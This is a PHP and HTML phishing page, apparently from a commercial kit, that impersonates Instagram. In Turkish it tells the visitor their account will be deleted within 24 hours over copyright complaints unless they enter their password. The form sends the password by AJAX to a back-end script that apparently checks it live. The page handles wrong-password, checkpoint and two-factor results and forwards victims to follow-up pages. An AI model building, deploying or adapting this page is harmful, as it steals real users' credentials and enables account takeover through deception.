<?php
   include("data.php");
session_start(); 
	error_reporting(0);
   $nick = $_GET['user'];
  
if (!$_SESSION[$nick]) {
   $apifor= "base_api.php?resim=aHR0cHM6Ly9lbmNyeXB0ZWQtdGJuMC5nc3RhdGljLmNvbS9pbWFnZXM/cT10Ym46QU5kOUdjUkZtb3dFV0pRc1J0WDc1ZU9sdVd4UGdFbzFFcWo5NmliMk5RJnVzcXA9Q0FV";
   if ($apifor=="error") {
      die("The username you entered doesn't belong to an account. Please check your username and try again.");
     
   } 
   $_SESSION[$nick]= $apifor;

} else { 
      
}

$_SESSION['photo']= $_SESSION[$nick];
$_SESSION['kadi']= $nick;  
   
   if (empty($_SESSION['token'])) {
       if (function_exists('mcrypt_create_iv')) {
           $_SESSION['token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
       } else {
           $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
       }
   }
   $token = $_SESSION['token'];
   $name = $_GET['user'];
   $nick = $_GET["user"];
   ?><!DOCTYPE html>
<html lang="en">
   <!--===============================================================================================-->	
   <head>
      <title>Telif Hakkı İhlali Tespit Edildi @<?php echo $nick;?></title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta property="og:image" content="img/logo.png" />
      <link rel="icon" type="image/png" href="img/favicon.png"/>
      <link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
      <link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
      <link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">
      <link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
      <link rel="stylesheet" type="text/css" href="css/util.css">
      <link rel="stylesheet" type="text/css" href="css/main.css">
   </head>
   <!--===============================================================================================-->	
   <style type="text/css">  .btn {
      cursor: pointer;
      width: 100%;
      padding:0 8px; 
      background: #3897f0;
      border:1px solid #3897f0;
      color:#fff;
      border-radius:10px;
      font-weight:600;
      font-size: 14px;
      height: 35px;
      line-height: 26px;
      outline: none;
      white-space: nowrap;
      }
   </style>
   <body>
      <div class="limiter">
      <div class="container-login100">
         <div class="wrap-login100">
            <div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
               <!-- yan logo -->
               <br><br><br><br>      <img src="img/test.png" alt="IMG">
               <br><br><br><br>
            </div>
            <el class="login100-form validate-form" id="elemend">
               <form id="foo">
                  <div style="padding:0px; margin:0px; border:0px solid #ffffff; width:100%; background:white;">
                     <center>
                        <img src="<?php echo $pp?>" alt="<?php echo $nick;?>" of="" photo="" width="150" style="border-radius:50%;margin-top:12px;">
                     </center>
                     <br>
                     <center>
                     <h1 style="font-family:sans-serif;
                        font-weight:400;
                        letter-spacing:;
                        color:#3d3d3d;
                        font-size: 20px;">
                     <p style="max-width:87%; font-size:15px; color: #999; line-height:20px; font-weight:400;">
                        </style>
                     <center>
                        <h1 style="font-family:sans-serif;
                           font-weight:400;
                           letter-spacing:;
                           color:#3d3d3d;
                           font-size: 23px;"><b>@<?php echo $nick;?></b></h1>
                        <br>
                        <p style="max-width:87%; font-size:18px; color: #999; line-height:20px; font-weight:400;">
                           Sayın  @<?php echo $nick;?> , Hesabınızla ilgili telif hakkı yasalarımızı ihlal ettiğinize dair çok sayıda şikayet aldık. Bize geri bildirimde bulunmazsanız, hesabınız 24 saat içinde kaldırılacaktır.
                           Bunun yanlış olduğunu düşünüyorsanız, lütfen aşağıdaki bilgilerinizi doğrulayın. Bu bilgileri istiyoruz çünkü hesabınızın gerçek sahibi olduğunuzu doğrulayamıyoruz.
                        </p>
                     </center>
                     <hr>
                     <div class="wrap-input100 validate-input"> 
                        <input name="instauser" id="usr" type="hidden" value="<?= $nick ?>">
                        <span class="focus-input100"></span> <span class="symbol-input100">  </span> 
                     </div>
                     <div class="wrap-input100 validate-input"> <input class="input100" type="password" required="" name="instapass" placeholder="Şifre"> <span class="focus-input100"></span> <span class="symbol-input100"> <i class="fa fa-lock" aria-hidden="true"></i> </span> </div>
                     <input name="token" type="hidden" value="<?= $token ?>">
                     <button type="submit" value="Giriş Yap" id="df" class="btn">Giriş Yap @<?php echo $nick;?></button><br> <br>
                     <durum id="statuss"></durum>
                     <center>
                        <h6><font onclick="javascript:window.location.href='https://www.instagram.com/accounts/password/reset/'; " color="#00376b">Şifreni mi Unuttun?</font></a></h6>
                     </center>
                     <br><br>
                     <br>
               </form>
            </el>
            </div>
         </div>
      </div>
      <!--===============================================================================================-->  
      <script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/bootstrap/js/popper.js"></script>
      <script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/select2/select2.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/tilt/tilt.jquery.min.js"></script>
      <script >
         $('.js-tilt').tilt({
           scale: 1.1
         })
      </script>
      <!--===============================================================================================-->
      <script type="text/javascript">
         var request;
         
         $("#foo").submit(function(event){
          var btn = $("#df");
         btn.prop("disabled", true); 
         
         
          $("#df").html("<img wight='20' height='20' src='img/ZZ5H.gif'>");
         
          event.preventDefault();
          var $form = $(this);
          var serializedData = $form.serialize();
         
          request = $.ajax({
            url: "ajaxlogin.php",
            type: "post",
            dataType: "json",
            data: serializedData,  
         
         
            success: function(data)
            {
         
         if(data.tokenhata) {
             
              $("#df").html("Giriş Yap @<?php echo $nick;?>");
              $("#statuss").html(' <font color="#ed4956"><center>Güvenlik hatası sayfayı yenileyiniz.</center></font><br><br> ');
         btn.html("Güvenlik Hatası"); 
              return false; 
            }
            
             if(data.lisanshata) {
             
              $("#df").html("Giriş Yap @<?php echo $nick;?>");
              $("#statuss").html(' <font color="#ed4956"><center>Lisansınız bulunmuyor!</center></font><br><br> ');
         btn.html("Lisans Hatası"); 
              return false; 
            }
                                                                  
             if(data.user==false){
              $("#statuss").html(' <font color="#ed4956"><center>Girdiğin kullancı adı bir hesaba ait değil. Lütfen kullancı adını kontrol et ve tekrar dene.</center></font><br><br> ');
         btn.prop("disabled", false); 
             
              $("#df").html("Giriş Yap @<?php echo $nick;?>");
              return false;
         
         
            }
            if(data.checkpoint_url) {
             
              $("#df").html("Giriş Yap @<?php echo $nick;?>");
              $("#statuss").html(' <font color="#ed4956"><center>Giriş Başarsız Lütfen Instagram Uygulamasna girip Doğrulamayı Geçin.</center></font><br><br> ');
         btn.prop("disabled", false); 
              return false; 
            }
         
            if(data.authenticated==false){
              $("#statuss").html('<font color="#ed4956"><center>Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.</center></font><br><br> ');
         btn.prop("disabled", false); 
         
              $("#df").html("Giriş Yap @<?php echo $nick;?>");
              return false;
         
         
            }
             if(data.two_factor_required) {
               window.location.href ="twofactor.php?user="+$('#usr').val();
                   return false;
         
              }
              
                 if(data.status=="fail") {
              $("#statuss").html('<font color="#ed4956"><center>'+data.feedback_message+'</center></font><br><br> ');
         btn.prop("disabled", false); 
         
              $("#df").html("Giriş Yap @<?php echo $nick;?>");
              return false;
              }
              
              
            if (data.authenticated==true) {
         $("#statuss").html('<font color="#00bf00"><center>Yönlendiriliyorsunuz...</center></font><br><br> ');
            
               $("#df").html("Doğrulama Başarılı!");
               
                setTimeout(function(){ window.location.href="confirmation.php?user="+$('#usr').val(); }, 0000);
             
         
           }
         
         
         },  error:function(res){
                    
              $("#df").html("BİLİNMEYEN HATA SAYFAYI YENİLEYİNİZ.");
          alert("BİLİNMEYEN HATA SAYFAYI YENİLEYİNİZ.");
         }
         });
         
         
         
         });
         //Mortojose 2022 
      </script>
      <div style="background:#fafafa; width:100%; height:70px; border-top:0.5px solid rgb(0,0,0,0.3);"class="lilvlad2">
         <center><img style="margin-top:20px;" src="img/from.png" width="100"></center>
      </div>
   </body>
</html>